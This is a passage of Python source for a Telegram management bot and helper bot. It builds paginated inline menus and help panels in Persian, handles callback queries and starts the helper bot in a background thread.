                            message_text="<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه اول - 10 قابلیت اصلی</i>",
                            parse_mode='HTML'
                        ),
                        reply_markup=get_main_menu_page1(user_id)
                    ),
                    InlineQueryResultArticle(
                        id="2",
                        title="🎛 پنل مدیریت سلف - صفحه 2",
                        description="11 قابلیت تکمیلی - ابزارهای پیشرفته",
                        input_message_content=InputTextMessageContent(
                            message_text="<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه دوم - 11 قابلیت تکمیلی</i>",
                            parse_mode='HTML'
                        ),
                        reply_markup=get_main_menu_page2(user_id)
                    )
                ]
                await update.inline_query.answer(results, cache_time=300, is_personal=True)
        
        async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
            query = update.callback_query
            await query.answer()
            
            data = query.data
            user_id = query.from_user.id
            
            if not f"_{user_id}" in data:
                await query.answer("دسترسی denied!", show_alert=True)
                return
            parts = data.split("_")
            if len(parts) >= 3:
                action = parts[1]
                if len(parts) >= 4 and parts[-1].isdigit():
                    page_num = int(parts[-1])
                else:
                    page_num = 1 
            else:
                await query.answer("داده نامعتبر!", show_alert=True)
                return
            
            print(f"Debug: action={action}, page={page_num}, data={data}")  # برای دیباگ
            if action == "close":
                text = "✅ <b>پنل بسته شد</b>\n\n💡 برای باز کردن مجدد:\n<code>@BotUsername panel</code>"
                await query.edit_message_text(text, reply_markup=get_reopen_button(user_id), parse_mode='HTML')
                return
            
            if action == "reopen":
                text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه اول - 10 قابلیت اصلی</i>"
                await query.edit_message_text(text, reply_markup=get_main_menu_page1(user_id), parse_mode='HTML')
                return
            
            if action == "page1":
                text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه اول - 10 قابلیت اصلی</i>"
                await query.edit_message_text(text, reply_markup=get_main_menu_page1(user_id), parse_mode='HTML')
                return
            
            if action == "page2":
                text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه دوم - 11 قابلیت تکمیلی</i>"
                await query.edit_message_text(text, reply_markup=get_main_menu_page2(user_id), parse_mode='HTML')
                return
            
            if action == "main":
                text = HELP_TEXTS["main"]
                await query.edit_message_text(text, reply_markup=get_main_menu_page1(user_id), parse_mode='HTML')
                return    
            if action == "back":
                if page_num == 1:
                    text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه اول - 10 قابلیت اصلی</i>"
                    await query.edit_message_text(text, reply_markup=get_main_menu_page1(user_id), parse_mode='HTML')
                elif page_num == 2:
                    text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه دوم - 11 قابلیت تکمیلی</i>"
                    await query.edit_message_text(text, reply_markup=get_main_menu_page2(user_id), parse_mode='HTML')
                else:
                    text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه اول - 10 قابلیت اصلی</i>"
                    await query.edit_message_text(text, reply_markup=get_main_menu_page1(user_id), parse_mode='HTML')
                return
            if action in HELP_TEXTS:
                text = HELP_TEXTS.get(action, "راهنمای این بخش آماده نیست.")
                await query.edit_message_text(text, reply_markup=get_back_button(user_id, page_num), parse_mode='HTML')
            else:
                await query.answer(f"این بخش ({action}) آماده نیست!", show_alert=True)
        
        async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
            logger.error(f"Error: {context.error}")
        
        def helper_main():
            helper_app2 = Application.builder().token(HELPER_TOKEN).build()
            helper_app2.add_handler(MessageHandler(TgFilters.TEXT & ~TgFilters.COMMAND, show_menu))
            helper_app2.add_handler(InlineQueryHandler(handle_inline_query))
            helper_app2.add_handler(CallbackQueryHandler(handle_callback))
            helper_app2.add_error_handler(error_handler)
            print("Helper bot started (internal)")
            helper_app2.run_polling()
    except Exception as e:
        HELPER_AVAILABLE = False
        print(f"Helper bot disabled: {e}")

    def run_helper_bot():
        if not HELPER_AVAILABLE:
            return
        try:
            helper_app = Application.builder().token(HELPER_TOKEN).build()
            helper_app.add_handler(MessageHandler(TgFilters.TEXT & ~TgFilters.COMMAND, show_menu))
            helper_app.add_handler(InlineQueryHandler(handle_inline_query))
            helper_app.add_handler(CallbackQueryHandler(handle_callback))
            helper_app.add_error_handler(error_handler)
            print("Helper bot started")
            helper_app.run_polling()
        except Exception as e:
            print(f"Helper bot error: {e}")

    async def main():
        helper_thread = threading.Thread(target=run_helper_bot, daemon=True)
        helper_thread.start()
        await idle()

    if __name__ == "__main__":
        print("Management bot + Helper bot started")
        bot.run(main())
